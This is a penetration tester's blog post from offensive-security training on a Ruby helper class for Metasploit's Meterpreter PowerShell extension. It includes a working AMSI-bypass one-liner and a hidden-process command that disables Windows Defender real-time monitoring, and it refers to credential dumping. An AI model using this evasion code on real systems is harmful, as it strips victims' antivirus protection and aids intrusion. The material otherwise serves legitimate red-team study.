<!DOCTYPE html>
<html><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="/css/highlight.min.css">
    <link rel="stylesheet" type="text/css" href="/css/style.css">
    
    
    <title>Taha Draidia | A Class Helper for Metasploit Powershell Extension</title>
    <script src="/js/highlight.min.js"></script>
    <script> hljs.initHighlightingOnLoad(); </script>
</head><body>
        
        <div id="container" class="container">
<span class="home_button"><a href="/">Back to home</a></span>
<h2 class="note_title">
<a href="/posts/write-a-class-helper-for-metasploit-powershell-extension/" rel="bookmark"
           title="Permalink to A Class Helper for Metasploit Powershell Extension">A Class Helper for Metasploit Powershell Extension</a></h2>


<div class="note_info">
        <div class="origin">
            <strong>Created by:</strong><a href="https://twitter.com/tahadraidia">@tahadraidia</a> || <a href="https://tahadraidia.com">tahadraidia.com</a> 
        </div>
		<br />

        <div class="published" title="2021-11-28 15:43:16 &#43;0000 UTC">
            <strong>Published:</strong> <time datetime="2021-11-28">Nov 28, 2021</time>
        </div>
		<br />

        <div class="tags" title="tags">
        	
        	<strong>Tags:</strong>
        	
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/osep">OSEP</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/pen300">PEN300</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/metasploit">Metasploit</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/ruby">Ruby</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/powershell">Powershell</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/anti-virus">Anti Virus</a>
            
            
        </div>
</div>

<br>
<p>Three weeks ago or so I started writing a MSF script that automates repeated tasks such running reconnaissance scripts, dumping credentials, listing tokens that could be impersonated and so on.</p>
<p>The current script does all what I have listed above among other things, however, some part of the code generates Powershell cradles and executes Powershell commands, I would say that this is not an elegant way to do it.</p>
<p>For instance, here are two examples where I run Powershell commands:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">disable_defender</span>
	patchamsi <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like &#39;*iUtils&#39;) {$c=$b}};$d=$c.GetFields(&#39;NonPublic,Static&#39;);Foreach($e in $d) {if ($e.Name -like &#39;*Context&#39;) {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);&#34;</span>
	disableDefenderPWSHCMD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Set-MpPreference -DisableRealtimeMonitoring $true&#39;</span>
	arg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/c powershell -exec bypass -c </span><span style="color:#e6db74">#{</span>patchamsi<span style="color:#e6db74">}#{</span>disableDefenderPWSHCMD<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
	pwshprocess <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>process<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#39;C:\\Windows\\System32\\cmd.exe&#39;</span>, arg, { <span style="color:#e6db74">&#39;Hidden&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span> })
	print_good(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Powershell PID: </span><span style="color:#e6db74">#{</span>pwshprocess<span style="color:#f92672">.</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
	print_good(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Windows Defender should be disabled now&#34;</span>)
	pwshprocess<span style="color:#f92672">.</span>close
	<span style="color:#66d9ef">rescue</span> <span style="color:#66d9ef">Exception</span> <span style="color:#f92672">=&gt;</span> e
		print_error(<span style="color:#e6db74">&#34;Disabling Windows Defender failed: </span><span style="color:#e6db74">#{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
<span style="color:#66d9ef">end</span>
</code></pre></div><p>Above code disable Windows Defender using <code>Set-MpPreference</code> a Powershell command. I manually generate a Powershell command and then runs it as a child of a CMD process.</p>
<p>The second example is where I would like to know if the current box sets <code>Powershell Restricted Language</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_restricted_language?</span>
	cmd <span style="color:#f92672">=</span> cmd_exec(<span style="color:#e6db74">&#39;powershell -exec bypass -c $ExecutionContext.SessionState.LanguageMode&#39;</span>)
	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span> <span style="color:#66d9ef">if</span> cmd<span style="color:#f92672">.</span>include? <span style="color:#e6db74">&#39;ConstrainedLanguage&#39;</span>
	<span style="color:#66d9ef">false</span>
<span style="color:#66d9ef">end</span>
</code></pre></div><p>The piece of code above, simply reads the returned value of <code>$ExecutionContext.SessionState.LanguageMode</code> then returns a boolean.</p>
<p>Looking at the documentation of Metasploit ruby API, I found a nice API part of <code># Rex::Post::Meterpreter::Extensions::Powershell::Powershell</code> class, the two interesting functions are:</p>
<ul>
<li>run_string</li>
<li>import_file</li>
</ul>
<p>Those functions will be so handy, specially import_file, no need to a download cradle anymore or even worse downloading a file to disk.</p>
<p>Both functions takes a hash as a parameter, this makes writing the code more painful, beside the fact that the initialization of the class is done in two steps.</p>
<p>First, we need to load the extension by using <code>session.core.load(&quot;powershell&quot;)</code>  the function returns true if success, false otherwise, hence we need to to check the returned value before initializing the class itself. So I decided to create a class helper that do that at the initialization of the class and then we create a global instance of that class, which I can call when and where I desire.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PowershellHelper</span>
	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">initialize</span>(client)
		<span style="color:#66d9ef">if</span> client<span style="color:#f92672">.</span>core<span style="color:#f92672">.</span>use(<span style="color:#e6db74">&#39;powershell&#39;</span>)
			print_good(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Powershell loaded!&#34;</span>)
			@powershell <span style="color:#f92672">=</span> <span style="color:#66d9ef">Rex</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Post</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Meterpreter</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Extensions</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Powershell</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Powershell</span><span style="color:#f92672">.</span>new(client)
		<span style="color:#66d9ef">else</span>
			print_error(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Loading Powershell failed&#34;</span>)
		<span style="color:#66d9ef">end</span>
	<span style="color:#66d9ef">end</span>

	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">execute_command</span>(command)
		@powershell<span style="color:#f92672">.</span>execute_string({<span style="color:#e6db74">:code</span> <span style="color:#f92672">=&gt;</span> command})
	<span style="color:#66d9ef">end</span>

	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_script</span>(file)
		<span style="color:#66d9ef">if</span> @powershell<span style="color:#f92672">.</span>import_file({<span style="color:#e6db74">:file</span> <span style="color:#f92672">=&gt;</span> file})
			print_good(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">#{</span>file<span style="color:#e6db74">}</span><span style="color:#e6db74"> imported&#34;</span>)
		<span style="color:#66d9ef">else</span>
			print_error(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">importing </span><span style="color:#e6db74">#{</span>file<span style="color:#e6db74">}</span><span style="color:#e6db74"> failed&#34;</span>)
		<span style="color:#66d9ef">end</span>
	<span style="color:#66d9ef">end</span>
<span style="color:#66d9ef">end</span>
</code></pre></div><p>The constructing does the boring task, next I created more named functions that takes strings rather a hash, which makes reduces the calories we burn when typing on the keyboard.</p>
<p>The usage now is more simple, we start by creating a global PowershellHelper instance.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">$powershell <span style="color:#f92672">=</span> <span style="color:#66d9ef">PowershellHelper</span><span style="color:#f92672">.</span>new(session)
</code></pre></div><p>Then we simply invoke one of the wished function anywhere in the code, below is the altered version of is_restricted_language?().</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_restricted_language?</span>
	cmd <span style="color:#f92672">=</span> $powershell<span style="color:#f92672">.</span>execute_command(<span style="color:#e6db74">&#39;$ExecutionContext.SessionState.LanguageMode&#39;</span>)
	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span> <span style="color:#66d9ef">if</span> cmd<span style="color:#f92672">.</span>include? <span style="color:#e6db74">&#39;ConstrainedLanguage&#39;</span>
	<span style="color:#66d9ef">false</span>
<span style="color:#66d9ef">end</span>
</code></pre></div><p>references:</p>
<ul>
<li><a href="https://www.offensive-security.com/metasploit-unleashed/custom-scripting/">https://www.offensive-security.com/metasploit-unleashed/custom-scripting/</a></li>
<li><a href="https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html">https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html</a></li>
<li><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Powershell/Powershell">https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Powershell/Powershell</a></li>
<li><a href="https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/">https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/</a></li>
<li><a href="https://www.windowscentral.com/how-manage-microsoft-defender-antivirus-powershell-windows-10">https://www.windowscentral.com/how-manage-microsoft-defender-antivirus-powershell-windows-10</a></li>
</ul>

  <div class="contact">
    <h2>Contact</h2>
    Please feel free to ping me at <a href="https://twitter.com/tahadraidia">@tahadraidia</a>. Also you can see more of my work at <a href="https://tahadraidia.com">https://tahadraidia.com</a>.
</div>
</br> 
        </div>
        <script> hljs.initHighlightingOnLoad(); </script></body>
</html>
